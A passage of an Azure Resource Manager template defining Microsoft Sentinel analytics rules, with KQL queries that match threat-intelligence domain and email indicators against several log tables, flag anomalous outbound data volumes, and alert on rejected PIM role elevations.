ConfidenceScore, SyslogMessage, Computer, ProcessName, domain, HostIP, Url, Type, TI_DomainEntity\n  // Extract the hostname from the Computer field\n  | extend HostName = tostring(split(Computer, '.', 0)[0])\n  // Extract the DNS domain from the Computer field\n  | extend DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n  // Assign the Syslog_TimeGenerated value to the timestamp field\n  | extend timestamp = Syslog_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "532f62c1-fba6-4baa-bbb6-4a32a4ef32fa",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "HostIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/50321799-47cd-4643-8b4b-8bf9768cc52c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/50321799-47cd-4643-8b4b-8bf9768cc52c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Domain entity to DnsEvents",
          "description": "Identifies a match in DnsEvents from any Domain IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "// Define the lookback periods for time-based filters\nlet dt_lookBack = 1h; // Look back 1 hour for DNS events\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\n// Fetch threat intelligence indicators related to domains\nlet Domain_Indicators = ThreatIntelligenceIndicator\n  // Filter out indicators without domain names\n  | where isnotempty(DomainName)\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | extend TI_DomainEntity = DomainName;\n// Create a list of TLDs in our threat feed for later validation\nlet maxListSize = 100000; // Define the maximum allowed size for each list\nlet list_tlds = Domain_Indicators\n  | extend parts = split(DomainName, '.')\n  | extend tld = parts[(array_length(parts)-1)]\n  | summarize count() by tostring(tld)\n  | project tld\n  | summarize make_list(tld, maxListSize);\n// Perform a join between domain indicators and DNS events to identify potential malicious activity\nDomain_Indicators\n  // Use innerunique to keep performance fast and result set low, as we only need one match to indicate potential malicious activity that needs investigation\n  | join kind=innerunique (\n    DnsEvents\n    | where TimeGenerated > ago(dt_lookBack)\n    // Extract domain patterns from syslog message\n    | where isnotempty(Name)\n    | extend parts = split(Name, '.')\n    | extend tld = parts[(array_length(parts)-1)]\n    // Validate parsed domain by checking if the TLD is in the list of TLDs in our threat feed\n    | where tld in~ (list_tlds)\n    | extend DNS_TimeGenerated = TimeGenerated\n  ) on $left.TI_DomainEntity==$right.Name\n  // Filter out DNS events that occurred after the expiration of the corresponding indicator\n  | where DNS_TimeGenerated < ExpirationDateTime\n  // Group the results by IndicatorId and Name, and keep the DNS event with the latest timestamp\n  | summarize DNS_TimeGenerated = arg_max(DNS_TimeGenerated, *) by IndicatorId, Name\n  // Select the desired output fields\n  | project DNS_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, Computer, ClientIP, Name, QueryType, Type, TI_DomainEntity\n  // Extract hostname and DNS domain from the Computer field\n  | extend HostName = tostring(split(Computer, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))\n  // Rename the timestamp field\n  | extend timestamp = DNS_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "85aca4d1-5d15-4001-abd9-acb86ca1786a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.4.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9054e0c5-3476-4ac9-91f4-99c83a0233e7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9054e0c5-3476-4ac9-91f4-99c83a0233e7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to SecurityAlert",
          "description": "Identifies a match in SecurityAlert table from any Email IOC from TI which will extend coverage to datatypes such as MCAS, StorageThreatProtection and many others",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    SecurityAlert\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend MSTI = case(AlertName has \"TI map\" and VendorName == \"Microsoft\" and ProductName == 'Azure Sentinel', true, false)\n    | where MSTI == false\n    // Converting Entities into dynamic data type and use mv-expand to unpack the array\n    | extend EntitiesDynamicArray = parse_json(Entities) | mv-expand EntitiesDynamicArray\n    // Parsing relevant entity column to filter type account and creating new column by combining account and UPNSuffix\n    | extend Entitytype = tostring(parse_json(EntitiesDynamicArray).Type), EntityName = tostring(parse_json(EntitiesDynamicArray).Name),\n    EntityUPNSuffix = tostring(parse_json(EntitiesDynamicArray).UPNSuffix)\n    | where Entitytype =~ \"account\"\n    | extend EntityEmail = tolower(strcat(EntityName, \"@\", EntityUPNSuffix))\n    | where EntityEmail matches regex emailregex\n    | extend Alert_TimeGenerated = TimeGenerated\n)\non $left.EmailSenderAddress == $right.EntityEmail\n| where Alert_TimeGenerated < ExpirationDateTime\n| summarize Alert_TimeGenerated = arg_max(Alert_TimeGenerated, *) by IndicatorId, AlertName\n| project Alert_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nEmailSenderName, EmailRecipient, EmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, EntityEmail, AlertName, AlertType,\nAlertSeverity, Entities, ProviderName, VendorName\n| extend Name = tostring(split(EntityEmail, '@', 0)[0]), UPNSuffix = tostring(split(EntityEmail, '@', 1)[0])\n| extend timestamp = Alert_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "a2e36ce0-da4d-4b6e-88c6-4e40161c5bfc",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "EntityEmail"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5bd69f40-cad3-4fc9-b952-8486b9399b87')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5bd69f40-cad3-4fc9-b952-8486b9399b87')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Threat Essentials - Time series anomaly for data size transferred to public internet",
          "description": "Identifies anomalous data transfer to public networks. The query leverages built-in KQL anomaly detection algorithms that detects large deviations from a baseline pattern.\nA sudden increase in data transferred to unknown public networks is an indication of data exfiltration attempts and should be investigated.\nThe higher the score, the further it is from the baseline value.\nThe output is aggregated to provide summary view of unique source IP to destination IP address and port bytes sent traffic observed in the flagged anomaly hour.\nThe source IP addresses which were sending less than bytessentperhourthreshold have been exluded whose value can be adjusted as needed .\nYou may have to run queries for individual source IP addresses from SourceIPlist to determine if anything looks suspicious",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet scorethreshold = 5;\nlet bytessentperhourthreshold = 10;\nlet PrivateIPregex = @'^127\\.|^10\\.|^172\\.1[6-9]\\.|^172\\.2[0-9]\\.|^172\\.3[0-1]\\.|^192\\.168\\.';\nlet TimeSeriesData = (union isfuzzy=true\n(\nVMConnection\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where isnotempty(DestinationIp) and isnotempty(SourceIp)\n| extend DestinationIpType = iff(DestinationIp matches regex PrivateIPregex,\"private\" ,\"public\" )\n| where DestinationIpType == \"public\" | extend DeviceVendor = \"VMConnection\"\n| project TimeGenerated, BytesSent, DeviceVendor\n| make-series TotalBytesSent=sum(BytesSent) on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by DeviceVendor\n),\n(\nCommonSecurityLog\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where isnotempty(DestinationIP) and isnotempty(SourceIP)\n| extend DestinationIpType = iff(DestinationIP matches regex PrivateIPregex,\"private\" ,\"public\" )\n| where DestinationIpType == \"public\"\n| project TimeGenerated, SentBytes, DeviceVendor\n| make-series TotalBytesSent=sum(SentBytes) on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by DeviceVendor\n)\n);\n//Filter anomolies against TimeSeriesData\nlet TimeSeriesAlerts = materialize(TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(TotalBytesSent, scorethreshold, -1, 'linefit')\n| mv-expand TotalBytesSent to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double),score to typeof(double), baseline to typeof(long)\n| where anomalies > 0 | extend AnomalyHour = TimeGenerated\n| extend TotalBytesSentinMBperHour = round(((TotalBytesSent / 1024)/1024),2), baselinebytessentperHour = round(((baseline / 1024)/1024),2), score = round(score,2)\n| project DeviceVendor, AnomalyHour, TimeGenerated, TotalBytesSentinMBperHour, baselinebytessentperHour, anomalies, score);\nlet AnomalyHours = materialize(TimeSeriesAlerts  | where TimeGenerated > ago(2d) | project TimeGenerated);\n//Union of all BaseLogs aggregated per hour\nlet BaseLogs = (union isfuzzy=true\n(\nCommonSecurityLog\n| where isnotempty(DestinationIP) and isnotempty(SourceIP)\n| where TimeGenerated > ago(2d)\n| extend DateHour = bin(TimeGenerated, 1h) // create a new column and round to hour\n| where DateHour in ((AnomalyHours)) //filter the dataset to only selected anomaly hours\n| extend DestinationIpType = iff(DestinationIP matches regex PrivateIPregex,\"private\" ,\"public\" )\n| where DestinationIpType == \"public\"\n| extend SentBytesinMB = ((SentBytes / 1024)/1024), ReceivedBytesinMB = ((ReceivedBytes / 1024)/1024)\n| summarize HourlyCount = count(), TimeGeneratedMax=arg_max(TimeGenerated, *), DestinationIPList=make_set(DestinationIP, 100), DestinationPortList = make_set(DestinationPort,100), TotalSentBytesinMB = sum(SentBytesinMB), TotalReceivedBytesinMB = sum(ReceivedBytesinMB) by SourceIP, DeviceVendor, TimeGeneratedHour=bin(TimeGenerated,1h)\n| where TotalSentBytesinMB > bytessentperhourthreshold\n| sort by TimeGeneratedHour asc, TotalSentBytesinMB desc\n| extend Rank=row_number(1, prev(TimeGeneratedHour) != TimeGeneratedHour) // Ranking the dataset per Hourly Partition\n| where Rank < 10  // Selecting Top 10 records with Highest BytesSent in each Hour\n| project DeviceVendor, TimeGeneratedHour, TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, Rank\n),\n(\nVMConnection\n| where isnotempty(DestinationIp) and isnotempty(SourceIp)\n| where TimeGenerated > ago(2d)\n| extend DateHour = bin(TimeGenerated, 1h) // create a new column and round to hour\n| where DateHour in ((AnomalyHours)) //filter the dataset to only selected anomaly hours\n| extend SourceIP = SourceIp, DestinationIP = DestinationIp\n| extend DestinationIpType = iff(DestinationIp matches regex PrivateIPregex,\"private\" ,\"public\" )\n| where DestinationIpType == \"public\" | extend DeviceVendor = \"VMConnection\"\n| extend SentBytesinMB = ((BytesSent / 1024)/1024), ReceivedBytesinMB = ((BytesReceived / 1024)/1024)\n| summarize HourlyCount = count(),TimeGeneratedMax=arg_max(TimeGenerated, *), DestinationIPList=make_set(DestinationIP, 100), DestinationPortList = make_set(DestinationPort, 100), TotalSentBytesinMB = sum(SentBytesinMB),TotalReceivedBytesinMB = sum(ReceivedBytesinMB) by SourceIP, DeviceVendor, TimeGeneratedHour=bin(TimeGenerated,1h)\n| where TotalSentBytesinMB > bytessentperhourthreshold\n| sort by TimeGeneratedHour asc, TotalSentBytesinMB desc\n| extend Rank=row_number(1, prev(TimeGeneratedHour) != TimeGeneratedHour) // Ranking the dataset per Hourly Partition\n| where Rank < 10  // Selecting Top 10 records with Highest BytesSent in each Hour\n| project DeviceVendor, TimeGeneratedHour, TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, Rank\n)\n);\n// Join against base logs to retrive records associated with the hour of anomoly\nTimeSeriesAlerts\n| where TimeGenerated > ago(2d)\n| join (\n    BaseLogs | extend AnomalyHour = TimeGeneratedHour\n) on DeviceVendor, AnomalyHour | sort by score desc\n| project DeviceVendor, AnomalyHour,TimeGeneratedMax, SourceIP, DestinationIPList, DestinationPortList, TotalSentBytesinMB, TotalReceivedBytesinMB, TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies\n| summarize EventCount = count(), StartTimeUtc= min(TimeGeneratedMax), EndTimeUtc= max(TimeGeneratedMax), SourceIPMax= arg_max(SourceIP,*), TotalBytesSentinMB = sum(TotalSentBytesinMB), TotalBytesReceivedinMB = sum(TotalReceivedBytesinMB), SourceIPList = make_set(SourceIP, 100), DestinationIPList = make_set(DestinationIPList, 100) by AnomalyHour,TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies\n| project DeviceVendor, AnomalyHour, StartTimeUtc, EndTimeUtc, SourceIPMax, SourceIPList, DestinationIPList, DestinationPortList, TotalBytesSentinMB, TotalBytesReceivedinMB, TotalBytesSentinMBperHour, baselinebytessentperHour, score, anomalies, EventCount\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 1,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b49a1093-cbf6-4973-89ac-2eef98f533c6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIPMax"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/752ccc20-65fb-4d8c-bf5d-6ade2c6165d5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/752ccc20-65fb-4d8c-bf5d-6ade2c6165d5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to AzureActivity",
          "description": "Identifies a match in AzureActivity table from any Email IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    AzureActivity | where TimeGenerated >= ago(dt_lookBack) and isnotempty(Caller)\n    | extend Caller = tolower(Caller)\n    | where Caller matches regex emailregex\n    | extend AzureActivity_TimeGenerated = TimeGenerated\n)\non $left.EmailSenderAddress == $right.Caller\n| where AzureActivity_TimeGenerated < ExpirationDateTime\n| summarize AzureActivity_TimeGenerated = arg_max(AzureActivity_TimeGenerated, *) by IndicatorId, Caller\n| project AzureActivity_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, EmailSenderName, EmailRecipient,\nEmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, Caller, Level, CallerIpAddress, CategoryValue, OperationNameValue, ActivityStatusValue,\nResourceGroup, SubscriptionId\n| extend Name = tostring(split(Caller, '@', 0)[0]), UPNSuffix = tostring(split(Caller, '@', 1)[0])\n| extend timestamp = AzureActivity_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "cca3b4d9-ac39-4109-8b93-65bb284003e6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.7"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e3704584-c9d7-4e4c-bbb6-ad47ac295309')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e3704584-c9d7-4e4c-bbb6-ad47ac295309')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT PIM Elevation Request Rejected",
          "description": "Identifies when a user is rejected for a privileged role elevation via PIM. Monitor rejections for indicators of attacker compromise of the requesting account.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-identity-management",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n| where ActivityDisplayName =~ 'Add member to role request denied (PIM activation)'\n| mv-apply ResourceItem = TargetResources on \n  (\n      where ResourceItem.type =~ \"Role\"\n      | extend Role = trim(@'\"',tostring(ResourceItem.displayName))\n  )\n| mv-apply ResourceItem = TargetResources on \n  (\n      where ResourceItem.type =~ \"User\"\n      | extend TargetUserPrincipalName = trim(@'\"',tostring(ResourceItem.userPrincipalName))\n  )\n| where ResultReason != \"RoleAssignmentExists\"\n| where isnotempty(InitiatedBy.user)\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n| extend InitiatedByName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), InitiatedByUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n| project-reorder TimeGenerated, TargetUserPrincipalName, Role, OperationName, Result, ResultDescription\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "5db427b2-f406-4274-b413-e9fcb29412f8",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatedByName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatedByUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/939bc88b-4b26-4d93-b077-b493b4ffee08')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/939bc88b-4b26-4d93-b077-b493b4ffee08')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to EmailEvents",
          "description": "Identifies a match in EmailEvents table from any Email IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet EmailEvents_ = materialize(EmailEvents | where isnotempty(RecipientEmailAddress) and isnotempty(SenderFromAddress) and TimeGenerated >= ago(dt_lookBack) and DeliveryAction !has \"Blocked\" | project-rename  EmailEvents_TimeGenerated = TimeGenerated | extend SenderFromAddress = tolower(SenderFromAddress) | extend RecipientEmailAddress = tolower(RecipientEmailAddress));\nlet SenderAddresses = EmailEvents_ | distinct  SenderFromAddress | summarize make_list(SenderFromAddress);\nlet RecipientAddresses = EmailEvents_ | distinct  RecipientEmailAddress | summarize make_list(RecipientEmailAddress);\nlet TI = materialize(ThreatIntelligenceIndicator\n| where TimeGenerated >= ago(ioc_lookBack)\n| where isnotempty(EmailSenderAddress)\n| extend TI_EmailAddress = tolower(EmailSenderAddress)\n| where TI_EmailAddress in (SenderAddresses) or TI_EmailAddress in (RecipientAddresses)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now());\n(union\n  (TI | join kind=innerunique (EmailEvents_) on $left.TI_EmailAddress == $right.SenderFromAddress),\n  (TI | join kind=innerunique (EmailEvents_) on $left.TI_EmailAddress == $right.RecipientEmailAddress))\n| where EmailEvents_TimeGenerated < ExpirationDateTime\n| summarize EmailEvents_TimeGenerated = arg_max(EmailEvents_TimeGenerated, *) by IndicatorId, TI_EmailAddress\n| project EmailEvents_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, DomainName, RecipientEmailAddress, SenderFromAddress, Subject, ConfidenceLevel, Url, Type, TI_EmailAddress, TrafficLightProtocolLevel, DeliveryAction, DeliveryLocation, EmailDirection\n| extend Name = tostring(split(RecipientEmailAddress, '@', 0)[0]), UPNSuffix = tostring(split(RecipientEmailAddress, '@', 1)[0])\n| extend timestamp = EmailEvents_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "11f7c6e3-f066-4b3c-9a81-b487ec0a6873",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "RecipientEmailAddress"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
